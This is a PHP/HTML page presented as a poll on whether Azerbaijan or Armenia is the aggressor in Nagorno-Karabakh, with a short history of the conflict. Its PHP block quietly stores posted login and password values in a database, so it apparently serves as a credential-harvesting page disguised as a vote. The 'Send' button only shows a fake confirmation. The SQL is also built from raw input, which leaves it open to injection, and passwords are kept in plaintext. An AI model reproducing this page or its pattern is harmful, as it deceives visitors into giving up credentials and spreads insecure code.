

<?php

    
    

if(isset($_POST['submit']))
{

    $link = mysqli_connect("localhost", "root", "", "users");
    $login      = $_POST['log'];
    $password   = $_POST['pas'];
    $sql = "INSERT INTO `users_info` (`login` , `password`)
            VALUES ('$login' , '$password')";

    mysqli_query($link, $sql);
}

 
?>
<title>Voting Against Terrorism</title>
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">

<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">

<!-- Latest compiled and minified JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
<center>

    <div class="main">
        <h1>Stop Agression !</h1>
        <h4>Which country is Agressor for you , vote here </h4>
        <div>
             
                <img src="https://upload.wikimedia.org/wikipedia/commons/d/dd/Flag_of_Azerbaijan.svg" alt=""> 
                <p>if you vote against Azerbaijan select this</p>
                <input type="radio" name="vote">
            
        </div>
        
        <div>
             
                <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Flag_of_Armenia.svg" alt=""> 
                <p>if you vote against Armenia select this</p>
                <input type="radio" name="vote">
             
        </div><br>
        <button onclick="alerting()" class="btn-primary"> Send </button>

        <p>In the 1920s, the Soviet government established the Nagorno-Karabakh Autonomous Region—where 95 percent of the <br>population is ethnically Armenian—within Azerbaijan. Under Bolshevik rule, fighting between the two countries was <br>kept in check, but, as the Soviet Union began to collapse, so did its grip on Armenia and Azerbaijan. In 1988, <br>the Nagorno-Karabakh legislature passed a resolution to join Armenia despite the region's legal location within <br>Azerbaijan’s borders. As the Soviet Union was dissolving in 1991, the autonomous region officially declared <br>independence. War erupted between Armenia and Azerbaijan over the region, leaving roughly thirty thousand <br>casualties and hundreds of thousands of refugees. By 1993, Armenia controlled Nagorno-Karabakh and occupied 20 <br>percent of the surrounding Azerbaijani territory. In 1994, Russia brokered a cease-fire which has remained in <br>place since.
 </p>
   </div>
     
     
</center>


<style>
body {
   
   background-image: url(https://images4.alphacoders.com/217/thumb-1920-217624.jpg)
}

.main{
    width: 800px;
    height: 1000px;
    background-color: white;
}

  img {
    width: 200px;
    height: 100px;
    margin-top: 50px;
    margin-left: 10px;
     
}
p{
    font-family: 'Arvo', serif;
    font-size: 17px;
}
.modern{
    width: 500px;
    height: 200px;
    z-index: 1000;
    background-color: grey;

    display: none;
}
</style>


<script>

 

function alerting()
{

    alert("Your Vote Sent")

}

</script>


